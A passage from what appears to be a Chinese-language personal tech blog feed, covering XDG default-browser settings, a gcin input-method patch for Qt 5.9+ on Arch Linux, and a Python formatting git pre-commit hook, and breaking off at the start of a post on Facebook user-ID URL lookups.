&lt;p&gt;只要是走 &lt;a href="https://specifications.freedesktop.org/mime-apps-spec/mime-apps-spec-1.0.html"&gt;XDG 標準&lt;/a&gt; 都可以用這個設定方式。（XDG 為 X Desktop Group 的縮寫）  &lt;/p&gt;
&lt;p&gt;XDG 的設定檔有下面三種路徑：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;個別使用者設定檔  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;~/.config/mimeapps.list&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;所有使用者共用  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/xdg/mimeapps.list&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系統預設設定檔  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/usr/local/share/applications/mimeapps.list&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/usr/share/applications/mimeapps.list&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但我修改了以後發現沒用，所以就直接透過 &lt;code&gt;xdg-settings&lt;/code&gt; 這個指令做設定，&lt;br /&gt;
後來用下面這一行解決：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;xdg-settings set default-web-browser qutebrowser.desktop&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;xdg-settings --list&lt;/code&gt; 可以察看有哪些 XDG properties 可以設定。  &lt;/p&gt;
&lt;p&gt;詳細內容可以參考這篇文章：&lt;a href="https://wiki.archlinux.org/index.php/Default_applications#xdg-utils"&gt;Default applications - ArchWiki&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Default_applications#xdg-utils"&gt;Default applications - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Freedesktop.org"&gt;freedesktop.org - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Desktop"></category><category term="XDG"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>解決 Arch Linux 上 gcin 2.8.5-2 無法在 Qt 5.9.x 以後的應用程式中執行的問題</title><link href="https://blog.m157q.tw/posts/2018/01/04/solution-for-gcin-2-8-5-2-cannot-run-in-application-using-qt-after-5-9-x-on-arch-linux/" rel="alternate"></link><published>2018-01-05T01:21:00+08:00</published><updated>2018-01-05T01:21:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-04:posts/2018/01/04/solution-for-gcin-2-8-5-2-cannot-run-in-application-using-qt-after-5-9-x-on-arch-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://hyperrate.com/thread.php?tid=33785"&gt;在基於較新版qt 5.9.1的軟體中無法輸入中文&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/qutebrowser/qutebrowser"&gt;qutebrowser&lt;/a&gt; 是一款以 Vim 操作流程為主、基於 PyQt5 上開發的的輕量化瀏覽器（有點類似 &lt;a href="https://bitbucket.org/portix/dwb"&gt;dwb&lt;/a&gt;）。2017 年中的時候就知道這款瀏覽器了，但沒有特別強烈的需求，因為我在使用 Firefox 或 Chromium 的時候都有安裝 Vimium 這個套件，所以可以做到一樣的事。  &lt;/p&gt;
&lt;p&gt;2017 年後半從 Firefox 55.0 開始，使用 Quantum 之後，我就從 Chromium 又跳回 Firefox 的懷抱，但接近 2017 年年底的時候，這篇文章：&lt;a href="https://sircmpwn.github.io/2017/12/16/Firefox-is-on-a-slippery-slope.html"&gt;Firefox is on a slippery slope | Drew DeVault’s Blog&lt;/a&gt;，講到了 Firefox 和美國的 NBCUniversal "合作"，為該公司新一季的電視劇 "Mr.Robot" 作宣傳。其手法是當你在瀏覽網頁的時候，如果裏面文字有和該劇相關的關鍵字的話，就會被倒過來顯示，而且也會在你造訪某些特定網站的時候，在你的 HTTP request 加入特定的 Header。重點是這是在未經使用者同意就預設開啟的測試功能內，直接幫使用者安裝一個叫作 "Looking Glass" 的 plugin，而且如果你把它關掉的話，在下次更新 Firefox 的時候又會被自動開啟。  &lt;/p&gt;
&lt;p&gt;再者是，討論這個功能的 ticket 是被鎖定的，只有 Mozilla 內部的人可以看到。這是非常不尊重使用者的行為，尤其 Firefox 又總是以不追蹤使用者、自由的開源軟體自居。雖然 Mozilla 在幾天後發了篇道歉文：&lt;a href="https://blog.mozilla.org/firefox/update-looking-glass-add/"&gt;Update: Looking Glass Add-on | The Firefox Frontier&lt;/a&gt;，但這件事還是讓滿多人留下不好的印象的，畢竟這代表專案主導人不尊重使用者，難保之後不會又發生。  &lt;/p&gt;
&lt;p&gt;剛好這篇文章的作者有提到他已經換到 qutebrowser 一陣子了，覺得還不錯用。剛好我也有在考慮要不要換過去使用，因為用了 Firefox 一陣子，雖然有比以前快，但還是常常會 crash，而且貌似也有 Memory Leak 的問題，常常用了一陣子記憶體就會愈用愈多，得重開才能解決。所以今天就下定決心拿 qutebrowser 來當預設的瀏覽器。  &lt;/p&gt;
&lt;p&gt;有機會的話可能會寫篇關於 qutebrowser 的介紹文，因為預設的 qutebrowser 其實不太好用，我花了點時間調整了設定才覺得比較能用。但這篇文章是要紀錄我在 Arch Linux 上安裝了基於 Qt5 開發的 qutebrowser 後，無法在其中使用 gcin 輸入法打中文字的問題。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;這篇應該只有在 Arch Linux 上的使用者可能會遇到，解法是在 gcin 論壇的這個討論串看到的：&lt;a href="https://hyperrate.com/thread.php?tid=33785"&gt;在基於較新版qt 5.9.1的軟體中無法輸入中文&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;先附上發生 bug 的軟體版本：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gcin 2.8.5-2  &lt;/li&gt;
&lt;li&gt;Qt 5.10.0  &lt;/li&gt;
&lt;li&gt;qutebrowser v1.0.4  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;步驟：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;先到 &lt;a href="https://git.archlinux.org/svntogit/packages.git/tree/trunk?h=packages/gcin"&gt;https://git.archlinux.org/svntogit/packages.git/tree/trunk?h=packages/gcin&lt;/a&gt; 把要 build &lt;code&gt;gcin&lt;/code&gt; 需要的檔案都抓下來，開個資料夾放這些檔案。  &lt;/li&gt;
&lt;li&gt;進到該資料夾內，根據討論串裡提到的解法修改 &lt;code&gt;PKGBUILD&lt;/code&gt;，加上這個 patch，&lt;a href="/files/solution-for-gcin-2-8-5-2-cannot-run-in-application-using-qt-after-5-9-x-on-arch-linux/qt-5.9.patch"&gt;這裡附上 patch 的純文字檔連結&lt;/a&gt;：  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/gcin/trunk/PKGBUILD b/gcin/trunk/PKGBUILD  &lt;/span&gt;
&lt;span class="gh"&gt;index ca08fcb57f3..7048c13411d 100644  &lt;/span&gt;
&lt;span class="gd"&gt;--- a/gcin/trunk/PKGBUILD  &lt;/span&gt;
&lt;span class="gi"&gt;+++ b/gcin/trunk/PKGBUILD  &lt;/span&gt;
&lt;span class="gu"&gt;@@ -39,6 +39,12 @@ prepare() {  &lt;/span&gt;
         -e &amp;#39;/^MODVERSION=/a INCS+=-I/usr/include/qt/QtGui/$(MODVERSION) -I/usr/include/qt/QtCore/$(MODVERSION)&amp;#39; \  
         -i qt5-im/Makefile  

&lt;span class="gi"&gt;+    # Patch to make gcin work in qt &amp;gt;= 5.9.x  &lt;/span&gt;
&lt;span class="gi"&gt;+    # ref: &amp;lt;https://hyperrate.com/thread.php?tid=33785&amp;gt;  &lt;/span&gt;
&lt;span class="gi"&gt;+      sed \  &lt;/span&gt;
&lt;span class="gi"&gt;+          -e &amp;#39;s/org.qt-project.Qt.QPlatformInputContextFactoryInterface/&amp;amp;.5.1/&amp;#39; \  &lt;/span&gt;
&lt;span class="gi"&gt;+          -i qt5-im/gcin-qt5.h.in  &lt;/span&gt;
&lt;span class="gi"&gt;+  &lt;/span&gt;
     # FS#45732  
     patch -p1 -i ../qt-5.5.patch  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;在該資料夾內下 &lt;code&gt;makepkg -s&lt;/code&gt; 這個指令，就會開始 build gcin  &lt;/li&gt;
&lt;li&gt;build 好之後應該會出現 &lt;code&gt;gcin-2.8.5-2-x86_64.pkg.tar.xz&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;sudo pacman -U gcin-2.8.5-2-x86_64.pkg.tar.xz&lt;/code&gt; 來安裝 patch 過後的 gcin  &lt;/li&gt;
&lt;li&gt;使用 &lt;code&gt;qtplugininfo /usr/lib/qt/plugins/platforminputcontexts/libgcinplatforminputcontextplugin.so&lt;/code&gt; 來檢查  &lt;ul&gt;
&lt;li&gt;如果沒問題的話應該會得到下面這樣的輸出：  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ qtplugininfo /usr/lib/qt/plugins/platforminputcontexts/libgcinplatforminputcontextplugin.so  
IID &lt;span class="s2"&gt;&amp;quot;org.qt-project.Qt.QPlatformInputContextFactoryInterface.5.1&amp;quot;&lt;/span&gt; Qt &lt;span class="m"&gt;5&lt;/span&gt;.10.0 &lt;span class="o"&gt;(&lt;/span&gt;debug&lt;span class="o"&gt;)&lt;/span&gt;  
User Data: &lt;span class="o"&gt;{&lt;/span&gt;  
    &lt;span class="s2"&gt;&amp;quot;Keys&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;  
        &lt;span class="s2"&gt;&amp;quot;gcin&amp;quot;&lt;/span&gt;  
    &lt;span class="o"&gt;]&lt;/span&gt;  
&lt;span class="o"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;重新開啟 gcin  &lt;/li&gt;
&lt;li&gt;重開 qutebrowser  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這樣應該就沒問題了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;總之，我發了一個 bug report: &lt;a href="https://bugs.archlinux.org/task/56949"&gt;FS#56949 : [gcin] gcin 2.8.5-2 cannot run in qutebrowser v1.0.4&lt;/a&gt;，希望這個 patch 會被加進去，這樣之後更新應該就沒問題了。  &lt;/p&gt;
&lt;p&gt;好像有點久沒有自己 build package 了啊，原本打算用 &lt;code&gt;abs&lt;/code&gt;，然後才想起來 &lt;code&gt;abs&lt;/code&gt; 已經被 deprecated 了：&lt;a href="https://www.archlinux.org/news/deprecation-of-abs/"&gt;Arch Linux - News: Deprecation of ABS tool and rsync endpoint&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/qutebrowser/qutebrowser"&gt;GitHub - qutebrowser/qutebrowser: A keyboard-driven, vim-like browser based on PyQt5.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://bitbucket.org/portix/dwb"&gt;portix / dwb — Bitbucket&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://sircmpwn.github.io/2017/12/16/Firefox-is-on-a-slippery-slope.html"&gt;Firefox is on a slippery slope | Drew DeVault’s Blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.mozilla.org/firefox/update-looking-glass-add/"&gt;Update: Looking Glass Add-on | The Firefox Frontier&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hyperrate.com/thread.php?tid=33785"&gt;在基於較新版qt 5.9.1的軟體中無法輸入中文&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Arch Linux"></category><category term="Qt5"></category><category term="qutebrowser"></category><category term="gcin"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>嘗試在 Python 中做到 Golang fmt 的效果</title><link href="https://blog.m157q.tw/posts/2018/01/03/try-to-do-gofmt-in-python/" rel="alternate"></link><published>2018-01-18T03:11:54+08:00</published><updated>2018-01-18T03:11:54+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-03:posts/2018/01/03/try-to-do-gofmt-in-python/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;去年開始學 Golang，但早在這之前就已經聽過很多 Gopher 說過 &lt;code&gt;gofmt&lt;/code&gt; 有多麼方便，當 Pythonista 還在靠 syntax checker 和自制力來遵守 &lt;a href="https://www.python.org/dev/peps/pep-0008/"&gt;PEP8&lt;/a&gt; 的時候，Gopher 根本都不用管什麼 coding style，不管你是怎麼寫的，只要寫好之後用 &lt;code&gt;gofmt&lt;/code&gt; 執行一下，就可以自動幫你把程式碼排版排好，還可以順便幫你檢查錯誤。  &lt;/p&gt;
&lt;p&gt;故事起源於 2016 底，和平常不是寫 Python 的朋友一起弄了一個用 Python 寫的 side project，因為朋友平常不是寫 Python 的，然後那陣子他又剛好在寫 Golang，覺得要遵守 PEP8 很麻煩，所以問我 Python 有沒有類似 &lt;code&gt;go fmt&lt;/code&gt; 的工具。  &lt;/p&gt;
&lt;p&gt;當下想了一下好像還真的沒有，頂多就是像 &lt;code&gt;pep8&lt;/code&gt;, &lt;code&gt;flake8&lt;/code&gt;, &lt;code&gt;pyflakes&lt;/code&gt; 這類的 syntax checker 而已，好像沒聽聞過什麼好用的 code formatter，也因為這樣，所以開始想辦法做到這件事。  &lt;/p&gt;
&lt;p&gt;當然真的去查了之後發現還是有的，但使用起來不盡理想。於是找了些現成的程式兜一兜，再加上 git pre-commit hook 後，最後算是勉強做到了，當下有做個凌亂的紀錄，但一直沒有整理成一篇文章，利用最近離職後比較閒的時間，把它整理紀錄一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;當時一開始是直接找到 GitHub 上的這個 repo: &lt;a href="https://github.com/Psycojoker/pyfmt"&gt;GitHub - Psycojoker/pyfmt: automatic code formatter for python following pep8 using baron FST, like gofmt&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;看起來好像不錯，但實際上使用起來有滿多問題的，而且作者又用了另外一個自己寫的 Python Full Syntax Tree library: &lt;a href="https://github.com/PyCQA/baron"&gt;GitHub - PyCQA/baron: IDE allow you to refactor code, Baron allows you to write refactoring code.&lt;/a&gt;，當時因為急著找現成的工具來用，所以就沒有多花時間研究。但後來才發現 PyCQA 裡頭的工具都滿不錯的: &lt;a href="https://github.com/PyCQA"&gt;Python Code Quality Authority · GitHub&lt;/a&gt;，基本上都是用來提升 Python 程式碼品質的工具，滿推薦寫 Python 的人看一下的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;之後試了幾個工具以後，最後變成 &lt;code&gt;autoflake&lt;/code&gt; + &lt;code&gt;isort&lt;/code&gt; + &lt;code&gt;autopep8&lt;/code&gt; + git pre-commit hook 來做到這件事，老實說真的有點繁瑣，但我找不到更好的方法，如果有人知道的話還請不吝告知。  &lt;/p&gt;
&lt;p&gt;總之，接下來稍微介紹一下這幾個工具分別做了哪些事：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;autoflake&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/myint/autoflake"&gt;GitHub - myint/autoflake: Removes unused imports and unused variables as reported by pyflakes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;就如同其 GitHub 的敘述，可以把沒有用到的 &lt;code&gt;import&lt;/code&gt; 和變數移除。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;isort&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/timothycrosley/isort"&gt;GitHub - timothycrosley/isort: A Python utility / library to sort imports.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;可以針對 Python 的 imports 做符合 PEP8 的字母序排序。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;autopep8&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/hhatto/autopep8"&gt;GitHub - hhatto/autopep8: A tool that automatically formats Python code to conform to the PEP 8 style guide.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;可以將 Python 程式碼自動以符合 PEP8 的方式排版。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;git pre-commit hook  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks"&gt;Git - Git Hooks&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;pre-commit hook 的觸發時間是在使用者下 &lt;code&gt;git commit&lt;/code&gt; 後，編寫 commit message 之前。  &lt;/li&gt;
&lt;li&gt;這裡是用來確保使用者每次 commit 的 Python 程式碼會被以上這三種程式處理過。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;後來發現 Google 也出了一個 Python formatter: &lt;a href="https://github.com/google/yapf"&gt;GitHub - google/yapf: A formatter for Python files&lt;/a&gt;，用了以後覺得比 &lt;code&gt;autopep8&lt;/code&gt; 好用，所以就把 &lt;code&gt;autopep8&lt;/code&gt; 換成 &lt;code&gt;yapf&lt;/code&gt; 了：&lt;a href="https://github.com/pellaeon/fengyuan/commit/abc9fc995a9c49fa208716954c2bc262fe6b783e"&gt;Use yapf instead of autopep8 as python code formatter. · pellaeon/fengyuan@abc9fc9 · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結果&lt;/h2&gt;
&lt;p&gt;最後的結果就是整合到一個 git pre-commit hook 裡頭，麻煩的是 clone 下來以後，得用這個指令初始化 git pre-commit hook：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ln -sf ../../pre-commit.sh .git/hooks/pre-commit  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其實還是很麻煩，之後應該會再繼續尋找有沒有更方便的方法，不排除自己寫一個就是。  &lt;/p&gt;
&lt;p&gt;最後的結果就是一個 git pre-commit hook：&lt;a href="https://github.com/pellaeon/fengyuan/blob/master/pre-commit.sh"&gt;fengyuan/pre-commit.sh at master · pellaeon/fengyuan · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;以下直接複製貼上原程式碼留個紀錄，以防哪天 GitHub 掛了。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/sh  &lt;/span&gt;
&lt;span class="c1"&gt;#  &lt;/span&gt;
&lt;span class="c1"&gt;# An example hook script to verify what is about to be committed.  &lt;/span&gt;
&lt;span class="c1"&gt;# Called by &amp;quot;git commit&amp;quot; with no arguments.  The hook should  &lt;/span&gt;
&lt;span class="c1"&gt;# exit with non-zero status after issuing an appropriate message if  &lt;/span&gt;
&lt;span class="c1"&gt;# it wants to stop the commit.  &lt;/span&gt;
&lt;span class="c1"&gt;#  &lt;/span&gt;
&lt;span class="c1"&gt;# To enable this hook, rename this file to &amp;quot;pre-commit&amp;quot;.  &lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; git rev-parse --verify HEAD &amp;gt;/dev/null &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;  
&lt;span class="k"&gt;then&lt;/span&gt;  
    &lt;span class="nv"&gt;against&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;HEAD  
&lt;span class="k"&gt;else&lt;/span&gt;  
    &lt;span class="c1"&gt;# Initial commit: diff against an empty tree object  &lt;/span&gt;
    &lt;span class="nv"&gt;against&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4b825dc642cb6eb9a060e54bf8d69288fbee4904  
&lt;span class="k"&gt;fi&lt;/span&gt;  

&lt;span class="c1"&gt;# If you want to allow non-ASCII filenames set this variable to true.  &lt;/span&gt;
&lt;span class="nv"&gt;allownonascii&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;git config --bool hooks.allownonascii&lt;span class="k"&gt;)&lt;/span&gt;  

&lt;span class="c1"&gt;# Redirect output to stderr.  &lt;/span&gt;
&lt;span class="nb"&gt;exec&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;  

&lt;span class="c1"&gt;# Cross platform projects tend to avoid non-ASCII filenames; prevent  &lt;/span&gt;
&lt;span class="c1"&gt;# them from being added to the repository. We exploit the fact that the  &lt;/span&gt;
&lt;span class="c1"&gt;# printable range starts at the space character and ends with tilde.  &lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$allownonascii&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;true&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;  
    &lt;span class="c1"&gt;# Note that the use of brackets around a tr range is ok here, (it&amp;#39;s  &lt;/span&gt;
    &lt;span class="c1"&gt;# even required, for portability to Solaris 10&amp;#39;s /usr/bin/tr), since  &lt;/span&gt;
    &lt;span class="c1"&gt;# the square bracket bytes happen to fall in the designated range.  &lt;/span&gt;
    &lt;span class="nb"&gt;test&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;git diff --cached --name-only --diff-filter&lt;span class="o"&gt;=&lt;/span&gt;A -z &lt;span class="nv"&gt;$against&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;  
      &lt;span class="nv"&gt;LC_ALL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;C tr -d &lt;span class="s1"&gt;&amp;#39;[ -~]\0&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; wc -c&lt;span class="k"&gt;)&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;  
&lt;span class="k"&gt;then&lt;/span&gt;  
    cat &lt;span class="s"&gt;&amp;lt;&amp;lt;\EOF  &lt;/span&gt;
&lt;span class="s"&gt;Error: Attempt to add a non-ASCII file name.  &lt;/span&gt;

&lt;span class="s"&gt;This can cause problems if you want to work with people on other platforms.  &lt;/span&gt;

&lt;span class="s"&gt;To be portable it is advisable to rename the file.  &lt;/span&gt;

&lt;span class="s"&gt;If you know what you are doing you can disable this check using:  &lt;/span&gt;

&lt;span class="s"&gt;  git config hooks.allownonascii true  &lt;/span&gt;
&lt;span class="s"&gt;EOF&lt;/span&gt;  
    &lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;  
&lt;span class="k"&gt;fi&lt;/span&gt;  

&lt;span class="c1"&gt;# Run syntax checker and formatter for Python files.  &lt;/span&gt;
&lt;span class="nv"&gt;STAGED_PYTHON_FILES&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;git diff --cached --name-only HEAD &lt;span class="s2"&gt;&amp;quot;*.py&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;  

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;  
&lt;span class="k"&gt;then&lt;/span&gt;  
    autoflake -i --remove-all-unused-imports --remove-unused-variables &lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;  
    isort -y &lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;  
    yapf -i &lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;  
    git add &lt;span class="nv"&gt;$STAGED_PYTHON_FILES&lt;/span&gt;  
&lt;span class="k"&gt;fi&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Psycojoker/pyfmt"&gt;GitHub - Psycojoker/pyfmt: automatic code formatter for python following pep8 using baron FST, like gofmt&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/PyCQA/baron"&gt;GitHub - PyCQA/baron: IDE allow you to refactor code, Baron allows you to write refactoring code.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/myint/autoflake"&gt;GitHub - myint/autoflake: Removes unused imports and unused variables as reported by pyflakes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/timothycrosley/isort"&gt;GitHub - timothycrosley/isort: A Python utility / library to sort imports.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hhatto/autopep8"&gt;GitHub - hhatto/autopep8: A tool that automatically formats Python code to conform to the PEP 8 style guide.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks"&gt;Git - Git Hooks&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/google/yapf"&gt;GitHub - google/yapf: A formatter for Python files&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pellaeon/fengyuan/commit/abc9fc995a9c49fa208716954c2bc262fe6b783e"&gt;Use yapf instead of autopep8 as python code formatter. · pellaeon/fengyuan@abc9fc9 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pellaeon/fengyuan/commit/2de3e199f2193ea25f4cd5bbb7f89673879862c6"&gt;Add git pre-commit hook for python files. · pellaeon/fengyuan@2de3e19 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/pellaeon/fengyuan/blob/master/pre-commit.sh"&gt;fengyuan/pre-commit.sh at master · pellaeon/fengyuan · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="formatter"></category><category term="Golang"></category><category term="gofmt"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Facebook 網址的一些黑魔法</title><link href="https://blog.m157q.tw/posts/2018/01/02/tips-about-facebook-url/" rel="alternate"></link><published>2018-01-03T19:01:27+08:00</published><updated>2018-01-03T19:01:27+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-02:posts/2018/01/02/tips-about-facebook-url/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://netbootcamp.org/facebookpeoplesearchtips/"&gt;https://netbootcamp.org/facebookpeoplesearchtips/&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;去年因為一些事件得知 Facebook 的網址列可以針對單一使用者作滿多查詢的，當下就有紀錄起來，但遲遲沒有整理成一篇文章。其實也是看到有人講了以後去做了些查詢，發現這篇英文文章：&lt;a href="https://netbootcamp.org/facebookpeoplesearchtips/"&gt;Facebook People Search Tips | OSINT Training by Bob Brasich&lt;/a&gt; 整理的挺完整的，所以這篇文章算是擷取整理這篇文章的內容，然後以中文呈現。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;要先知道什麼是 Facebook User ID&lt;/h2&gt;
&lt;p&gt;首先，你要知道你想查詢的使用者在 Facebook 上的 ID 是什麼，對這個有點概念的人都會知道這是一串流水號，而最常見的例子就是 Facebook 創辦人 Mark Zuckerburg 本人的 Facebook ID 是 4，所以你只要連到 &lt;a href="https://www.facebook.com/4"&gt;https://www.facebook.com/4&lt;/a&gt;，就會連到 Mark Zuckerburg 本人的 Facebook 頁面，而每一位 Facebook 使用者都會有這樣一個不與其他使用者重複的流水號作為其 Facebook 的 ID。  &lt;/p&gt;
&lt;p&gt;在接下來的使用方式裡頭，一定要要拿到使用者的 ID，拿到使用者自己自訂的唯一 username 是沒用的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;要怎麼拿到 Facebook 使用者的 ID？&lt;/h2&gt;
